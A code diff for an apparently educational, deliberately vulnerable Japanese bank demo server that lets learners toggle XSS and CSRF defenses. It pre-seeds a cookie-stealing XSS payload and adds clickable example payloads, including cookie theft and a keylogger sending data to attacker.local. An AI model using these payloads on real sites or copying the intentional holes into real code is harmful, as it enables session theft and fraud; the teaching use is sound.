@@ -9,9 +9,11 @@ app.use(express.static(path.join(__dirname, 'public')))
 
 // --- In-memory state ---
 const sessions = {}
-const comments = []
+const comments = [
+  `<img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)">`,
+]
 let csrfProtection = true
-let sameSite = 'lax'
+let sameSite = ''  // '' = SameSite未設定（制限なし）
 let xssProtection = false  // false = innerHTML（危険）, true = DOMPurify（安全）
 let cspEnabled = false     // true = Content-Security-Policy ヘッダーを付与
 let httpOnly = true        // false = JSからCookieが読める
@@ -50,7 +52,7 @@ function setCookieHeader(sessionId) {
   const flags = [
     `session=${sessionId}`,
     httpOnly ? 'HttpOnly' : '',
-    `SameSite=${sameSite}`,
+    sameSite ? `SameSite=${sameSite}` : '',
     'Path=/',
   ].filter(Boolean).join('; ')
   return flags
@@ -62,7 +64,8 @@ app.get('/', (req, res) => {
   const session = getSession(req)
   const flash = session?._flash || null
   if (session) delete session._flash
-  res.send(session ? dashboard(session, flash, res.locals.nonce) : loginPage())
+  const blocked = req.query.blocked || null
+  res.send(session ? dashboard(session, flash, res.locals.nonce) : loginPage(blocked))
 })
 
 app.post('/login', (req, res) => {
@@ -77,27 +80,29 @@ app.post('/login', (req, res) => {
 
 app.post('/transfer', (req, res) => {
   const session = getSession(req)
+  console.log(`[transfer] cookie="${req.headers.cookie || 'none'}" csrfProtection=${csrfProtection} csrf_token="${req.body?.csrf_token}" session=${!!session}`)
   if (!session) {
-    return res.status(401).send(`
-      <div style="padding:60px;font-family:sans-serif;text-align:center">
-        <h2 style="color:#27ae60">✅ SameSite=strict が効いています</h2>
-        <p>別サイトからのリクエストにCookieが付かないため、未ログイン扱いになりました。</p>
-        <a href="/">戻る</a>
-      </div>`)
+    return res.redirect('/?blocked=samesite')
   }
 
   const { to, amount, csrf_token } = req.body
 
   if (csrfProtection && csrf_token !== session.csrfToken) {
-    session._flash = { type: 'blocked', msg: `CSRFトークン不一致 → ${to} への ¥${amount} をブロックしました` }
+    session._flash = { type: 'blocked', defense: 'csrf_token', msg: `CSRFトークン不一致 → ${to} への ¥${amount} をブロックしました` }
     session.log.push(`🛡️ 送金ブロック → ${to} へ ¥${amount}（CSRFトークン不一致）`)
     return res.redirect('/')
   }
 
   const amt = parseInt(amount)
   session.balance -= amt
-  session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（攻撃成功）` }
-  session.log.push(`💸 送金完了 → ${to} へ ¥${amt}`)
+  const isLegitimate = csrf_token && csrf_token === session.csrfToken
+  if (isLegitimate) {
+    session._flash = { type: 'success', msg: `¥${amt.toLocaleString()} を ${to} に送金しました` }
+    session.log.push(`✅ 送金完了（正規） → ${to} へ ¥${amt}`)
+  } else {
+    session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（⚠️ 攻撃成功 — CSRFトークンなしで通りました）` }
+    session.log.push(`💸 攻撃成功 → ${to} へ ¥${amt}（CSRFトークンなし）`)
+  }
   res.redirect('/')
 })
 
@@ -105,12 +110,7 @@ app.post('/transfer', (req, res) => {
 app.get('/transfer-get', (req, res) => {
   const session = getSession(req)
   if (!session) {
-    return res.send(`
-      <div style="padding:60px;font-family:sans-serif;text-align:center">
-        <h2 style="color:#27ae60">✅ SameSite=strict が効いています</h2>
-        <p>リンクからの遷移にもCookieが付きませんでした。未ログイン扱いで攻撃失敗。</p>
-        <a href="/">戻る</a>
-      </div>`)
+    return res.redirect('/?blocked=samesite')
   }
   const { to, amount } = req.query
   const amt = parseInt(amount) || 0
@@ -121,7 +121,9 @@ app.get('/transfer-get', (req, res) => {
 })
 
 app.post('/comments', (req, res) => {
-  comments.push(req.body.comment || '')
+  const comment = req.body.comment || ''
+  console.log(`[comments] saved: "${comment.slice(0, 80)}"`)
+  comments.push(comment)
   res.redirect('/')
 })
 
@@ -132,7 +134,9 @@ app.get('/toggle-csrf',     (req, res) => { csrfProtection = !csrfProtection; re
 app.get('/toggle-xss',      (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
 app.get('/toggle-csp',      (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
 app.get('/toggle-samesite', (req, res) => {
-  sameSite = sameSite === 'strict' ? 'lax' : 'strict'
+  if (sameSite === '') sameSite = 'lax'
+  else if (sameSite === 'lax') sameSite = 'strict'
+  else sameSite = ''
   res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
   res.redirect('/')
 })
@@ -174,6 +178,7 @@ function css() {
     .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
     .flash { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 15px; font-weight: bold; }
     .flash-danger  { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+    .flash-success { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
     .flash-blocked { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
     .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 5px 0; font-size: 14px; border-radius: 0 4px 4px 0; background: #fafafa; }
     .preset code { background: #1e1e1e; color: #d4d4d4; padding: 8px 12px; border-radius: 6px; font-size: 12px; display: block; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
@@ -193,11 +198,18 @@ function css() {
   </style>`
 }
 
-function loginPage() {
+function loginPage(blocked) {
+  const blockedBanner = blocked === 'samesite' ? `
+  <div class="flash flash-blocked" style="border-left:4px solid #27ae60">
+    🛡️ <strong>SameSite Cookie（${sameSite || 'なし → 本来は弾けない'}）</strong> によってブロックされました<br>
+    <span style="font-size:13px;font-weight:normal">別サイトからのリクエストにCookieが付かなかったため、未ログイン扱いになりました</span>
+  </div>` : ''
+
   return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank（victim）</title>${css()}</head><body>
 <div class="wrap">
   <h1>🏦 bank.local</h1>
   <p class="sub">port 3000 — 被害者サイト（銀行）</p>
+  ${blockedBanner}
   <p>ユーザー名：何でもOK ／ パスワード：<strong>pass</strong></p>
   <form method="POST" action="/login">
     <input name="username" value="alice" placeholder="ユーザー名">
@@ -210,106 +222,113 @@ function loginPage() {
 
 function dashboard(session, flash, nonce) {
   const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
-  const demoData = JSON.stringify({ comments: comments.slice(-5), xssProtection })
+  const demoData = JSON.stringify({ comments, xssProtection })
+  const hl = flash?.defense  // 発動した対策のkey。対応する行をハイライトする
+  const rowHl = (key) => hl === key ? 'background:#d4edda;' : ''
 
   return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
 <div class="wrap">
   <h1>🏦 bank.local</h1>
   <p class="sub">port 3000 — ${escapeHtml(session.username)} さんがログイン中</p>
 
-  ${flash ? `<div class="flash flash-${flash.type}">${flash.type === 'blocked' ? '🛡️' : '💀'} ${escapeHtml(flash.msg)}</div>` : ''}
+  ${flash ? `<div class="flash flash-${flash.type}">${flash.type === 'blocked' ? '🛡️' : flash.type === 'success' ? '✅' : '💀'} ${escapeHtml(flash.msg)}</div>` : ''}
 
-  <p>残高 <span class="balance" id="balance">¥${session.balance.toLocaleString()}</span>
-    <a href="/reset" class="btn-sm">残高リセット</a>
-  </p>
+  <div style="display:grid;grid-template-columns:1fr 1.8fr;gap:24px;align-items:start">
 
-  <!-- 対策パネル -->
-  <div class="panel">
-    <div class="panel-head">🛡️ 対策パネル — ON/OFF を切り替えて攻撃の成否を確認する</div>
-    <div class="panel-body">
+    <!-- 左カラム：残高・メモ -->
+    <div>
+      <p style="margin:0 0 4px;font-size:13px;color:#888">残高</p>
+      <p style="margin:0 0 16px"><span class="balance" id="balance">¥${session.balance.toLocaleString()}</span>
+        <a href="/reset" class="btn-sm">リセット</a>
+      </p>
 
-      <div class="row">
-        <div class="row-label">
-          <div>XSS保護（DOMPurify）</div>
-          <div class="row-note">${xssProtection
-            ? '✅ ON — DOMPurify.sanitize() でコメントを無害化。onerrorなどを除去しつつHTMLは残す'
-            : '❌ OFF — コメントをそのまま innerHTML に挿入（v-html 相当）'}</div>
-        </div>
-        <span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span>
-        <a href="/toggle-xss" class="btn-sm">切り替え</a>
+      ${session.log.length ? `
+      <div style="margin-bottom:16px">
+        <ul style="margin:0;padding-left:18px">${session.log.slice(-5).map(l => `<li style="font-size:13px;margin:3px 0">${escapeHtml(l)}</li>`).join('')}</ul>
+      </div>` : ''}
+
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+        <span style="font-size:14px;font-weight:bold">取引メモ</span>
+        <a href="/reset-comments" class="btn-sm">クリア</a>
       </div>
+      <div id="comments-area" style="margin-bottom:10px"><p style="color:#aaa;font-size:13px">読み込み中...</p></div>
 
-      <div class="row">
-        <div class="row-label">
-          <div>CSP（Content Security Policy）</div>
-          <div class="row-note">${cspEnabled
-            ? '✅ ON — script-src \'self\' で外部・インラインスクリプトの実行をブロック。多層防御の2段目'
-            : '❌ OFF — スクリプト実行の制限なし'}</div>
+      <form method="POST" action="/comments" style="margin-bottom:8px">
+        <textarea name="comment" rows="2" placeholder="メモを入力..." style="font-size:13px;margin-bottom:6px"></textarea>
+        <button type="submit" style="font-size:13px;padding:6px 14px">保存</button>
+      </form>
+
+      <details style="margin-bottom:12px;font-size:12px">
+        <summary style="cursor:pointer;color:#888;user-select:none">XSSペイロード例</summary>
+        <div style="margin-top:8px;background:#f8f8f8;border-radius:6px;padding:10px">
+          <p style="margin:0 0 4px;font-weight:bold;color:#555">① アラート</p>
+          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="this.closest('form')||document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="alert('XSS')"&gt;</code>
+          <p style="margin:0 0 4px;font-weight:bold;color:#555">② 残高を書き換える</p>
+          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>
+          <p style="margin:0 0 4px;font-weight:bold;color:#555">③ Cookie盗取（HttpOnly OFF で試す）</p>
+          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
+          <p style="margin:0 0 4px;font-weight:bold;color:#555">④ キーロガー</p>
+          <code style="display:block;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="document.addEventListener('keydown',e=&gt;fetch('http://attacker.local:3001/stolen?key='+e.key))"&gt;</code>
+          <p style="margin:8px 0 0;color:#888">クリックするとテキストエリアにコピーされます</p>
         </div>
-        <span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span>
-        <a href="/toggle-csp" class="btn-sm">切り替え</a>
-      </div>
+      </details>
 
-      <div class="row">
-        <div class="row-label">
-          <div>HttpOnly Cookie</div>
-          <div class="row-note">${httpOnly
-            ? '✅ ON — document.cookie でCookieを読めない。ペイロード④でも盗めない'
-            : '❌ OFF — document.cookie でCookieが読める。ペイロード④でattackerのターミナルに表示される'}</div>
-        </div>
-        <span class="${httpOnly ? 'tag-on' : 'tag-off'}">${httpOnly ? 'ON' : 'OFF'}</span>
-        <a href="/toggle-httponly" class="btn-sm">切り替え（再ログイン）</a>
-      </div>
-
-      <div class="row">
-        <div class="row-label">
-          <div>CSRFトークン</div>
-          <div class="row-note">${csrfProtection
-            ? '✅ ON — 秘密値を照合。別サイトからの偽造リクエストをブロック'
-            : '❌ OFF — トークン検証なし。attacker.local からの送金が通る'}</div>
-        </div>
-        <span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span>
-        <a href="/toggle-csrf" class="btn-sm">切り替え</a>
-      </div>
-
-      <div class="row">
-        <div class="row-label">
-          <div>SameSite Cookie</div>
-          <div class="row-note">${sameSite === 'strict'
-            ? '✅ strict — 別サイトからのリクエストにCookieを付けない。未ログイン扱いになる'
-            : '⚠️ lax — POST/fetchはブロックするがリンク遷移（GET）にはCookieを送る → attacker.localのGETリンクCSRFが通る'}</div>
-        </div>
-        <span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}">${sameSite}</span>
-        <a href="/toggle-samesite" class="btn-sm">切り替え（再ログイン）</a>
-      </div>
-
+      <a href="/logout" class="btn-sm" style="margin-left:0">ログアウト</a>
     </div>
-  </div>
 
-  <!-- 送金フォーム（CSRF対象） -->
-  <div class="section-title">送金フォーム <span class="badge badge-danger">← CSRFの標的</span></div>
-  <form method="POST" action="/transfer" style="display:flex;gap:8px;align-items:flex-end">
-    <div style="flex:1"><input name="to" placeholder="送金先口座" style="margin:0"></div>
-    <div style="width:120px"><input name="amount" type="number" value="3000" style="margin:0"></div>
-    ${csrfProtection ? `<input type="hidden" name="csrf_token" value="${session.csrfToken}">` : ''}
-    <button type="submit" style="white-space:nowrap">送金する</button>
-  </form>
+    <!-- 右カラム：対策パネル -->
+    <div class="panel">
+      <div class="panel-head">🛡️ 対策パネル</div>
+      <div class="panel-body" style="padding:0">
+        <table style="width:100%;border-collapse:collapse;font-size:13px">
+          <thead>
+            <tr style="background:#f8f9fa;border-bottom:2px solid #e9ecef">
+              <th style="padding:8px 12px;text-align:left">対策</th>
+              <th style="padding:8px 8px;text-align:left">何を防ぐか</th>
+              <th style="padding:8px 8px;text-align:center;white-space:nowrap">状態</th>
+              <th style="padding:8px 12px;text-align:center">操作</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr data-defense="xss_dompur" style="border-bottom:1px solid #f0f0f0;${rowHl('xss_dompur')}">
+              <td style="padding:8px 12px;font-weight:bold">DOMPurify<span class="hl-label"></span></td>
+              <td style="padding:8px 8px;color:#555;font-size:12px">${xssProtection ? 'onerrorなど危険な属性を除去' : 'メモをそのままinnerHTMLに挿入'}</td>
+              <td style="padding:8px 8px;text-align:center"><span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span></td>
+              <td style="padding:8px 12px;text-align:center"><a href="/toggle-xss" class="btn-sm">切替</a></td>
+            </tr>
+            <tr data-defense="csp" style="border-bottom:1px solid #f0f0f0;${rowHl('csp')}">
+              <td style="padding:8px 12px;font-weight:bold">CSP<span class="hl-label"></span></td>
+              <td style="padding:8px 8px;color:#555;font-size:12px">${cspEnabled ? 'インライン・外部スクリプトをブロック' : 'スクリプト実行の制限なし'}</td>
+              <td style="padding:8px 8px;text-align:center"><span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span></td>
+              <td style="padding:8px 12px;text-align:center"><a href="/toggle-csp" class="btn-sm">切替</a></td>
+            </tr>
+            <tr style="border-bottom:1px solid #f0f0f0;${rowHl('httponly')}">
+              <td style="padding:8px 12px;font-weight:bold">HttpOnly</td>
+              <td style="padding:8px 8px;color:#555;font-size:12px">${httpOnly ? 'document.cookieで読めない' : 'JSからCookieが読める'}</td>
+              <td style="padding:8px 8px;text-align:center"><span class="${httpOnly ? 'tag-on' : 'tag-off'}">${httpOnly ? 'ON' : 'OFF'}</span></td>
+              <td style="padding:8px 12px;text-align:center"><a href="/toggle-httponly" class="btn-sm">切替<br><span style="font-size:10px;color:#aaa">（再ログイン）</span></a></td>
+            </tr>
+            <tr style="border-bottom:1px solid #f0f0f0;${rowHl('csrf_token')}">
+              <td style="padding:8px 12px;font-weight:bold">CSRFトークン${hl === 'csrf_token' ? ' <span class="hl-label" style="color:#155724;font-size:11px">← 発動</span>' : ''}</td>
+              <td style="padding:8px 8px;color:#555;font-size:12px">${csrfProtection ? '秘密値を照合、偽造リクエストをブロック' : 'トークン検証なし'}</td>
+              <td style="padding:8px 8px;text-align:center"><span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span></td>
+              <td style="padding:8px 12px;text-align:center"><a href="/toggle-csrf" class="btn-sm">切替</a></td>
+            </tr>
+            <tr>
+              <td style="padding:8px 12px;font-weight:bold">SameSite</td>
+              <td style="padding:8px 8px;color:#555;font-size:12px">${
+                sameSite === 'strict' ? 'クロスサイト全リクエストをブロック' :
+                sameSite === 'lax'    ? 'POSTはブロック、GETリンクは通る' :
+                                        '未設定 — クロスサイトにも自動付与'
+              }</td>
+              <td style="padding:8px 8px;text-align:center"><span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}" style="${sameSite === 'lax' ? 'background:#fff3cd;color:#856404' : ''}">${sameSite || 'なし'}</span></td>
+              <td style="padding:8px 12px;text-align:center"><a href="/toggle-samesite" class="btn-sm">切替<br><span style="font-size:10px;color:#aaa">（再ログイン）</span></a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
 
-  ${session.log.length ? `
-  <div style="margin-top:12px">
-    <ul style="margin:0">${session.log.slice(-5).map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>
-  </div>` : ''}
-
-  <!-- コメント欄（XSS着弾点） -->
-  <div class="section-title">
-    最新コメント
-    <span class="badge ${xssProtection ? 'badge-safe' : 'badge-danger'}">${xssProtection ? '✅ DOMPurify（安全）' : '❌ innerHTML（XSS着弾点）'}</span>
-    <a href="/reset-comments" class="btn-sm" style="margin-left:auto">コメントクリア</a>
-  </div>
-  <div id="comments-area"><p style="color:#aaa;font-size:13px">読み込み中...</p></div>
-  <div style="margin-top:12px">
-    <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
-    <a href="/logout" class="btn-sm">ログアウト</a>
   </div>
 
 </div>
@@ -318,7 +337,20 @@ function dashboard(session, flash, nonce) {
 </div>
 
 <!-- コメントデータをDOMに埋め込む（nonce付きで正規スクリプトとして許可） -->
-<script${nonceAttr}>window.__DEMO_DATA__ = ${demoData};</script>
+<script${nonceAttr}>
+window.__DEMO_DATA__ = ${demoData};
+window.highlightDefense = function(key) {
+  var row = document.querySelector('[data-defense="' + key + '"]');
+  if (!row || row.dataset.highlighted) return;
+  row.style.background = '#d4edda';
+  row.dataset.highlighted = '1';
+  var lbl = row.querySelector('.hl-label');
+  if (lbl) lbl.innerHTML = ' &#x1F6E1;&#xFE0F; <span style="color:#155724;font-size:11px">← 今ここが発動</span>';
+};
+window.addEventListener('securitypolicyviolation', function() {
+  window.highlightDefense('csp');
+});
+</script>
 <script src="/purify.min.js"></script>
 <script src="/client.js"></script>
 </body></html>`
@@ -326,14 +358,14 @@ function dashboard(session, flash, nonce) {
 
 function commentsPage(nonce) {
   const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
-  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>コメント投稿（XSSデモ）</title>${css()}</head><body>
+  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>取引メモ（XSSデモ）</title>${css()}</head><body>
 <div class="wrap">
-  <h1>💬 コメントを投稿する</h1>
-  <p class="sub">投稿するとダッシュボードに戻ります。仕込んだコードが <strong>銀行の画面で</strong> 実行されます。</p>
+  <h1>📝 取引メモを書く</h1>
+  <p class="sub">保存するとダッシュボードに戻ります。仕込んだコードが <strong>銀行の画面で</strong> 実行されます。</p>
 
   <form method="POST" action="/comments">
-    <textarea name="comment" rows="3" placeholder="ペイロードをここに貼り付けて投稿..."></textarea>
-    <button type="submit">投稿してダッシュボードへ</button>
+    <textarea name="comment" rows="3" placeholder="ペイロードをここに貼り付けて保存..."></textarea>
+    <button type="submit">保存してダッシュボードへ</button>
   </form>
 
   <div class="preset">
